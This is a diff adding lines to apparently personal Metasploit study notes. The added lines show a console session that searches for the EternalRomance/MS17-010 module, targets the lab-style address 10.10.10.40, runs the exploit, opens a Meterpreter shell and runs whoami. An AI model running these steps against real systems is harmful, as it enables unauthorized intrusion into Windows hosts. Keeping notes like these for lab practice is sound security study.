@@ -109,6 +109,18 @@ ls /usr/share/metasploit-framework/scripts
 ls /usr/share/metasploit-framework/tools
 # context docs hardware modules payloads dev exploit memdump password recon
 
+ms6 > search eternalromance
+msf6 > search eternalrmance type:exploit
+msf6 > search eternalromance type:exploit platform:windows cve:2021 rank:excellent microsoft
+msf6 > search ms17_010
+msf6 > use 0
+msf6 > options
+msf6 > info
+msf6 > set RHOSTS 10.10.10.40
+msf6 > setg RHOSTS 10.10.10.40
+run
+meterpreter > shell
+C:\Windows\system32> whoami
 ```
 
 ```bash
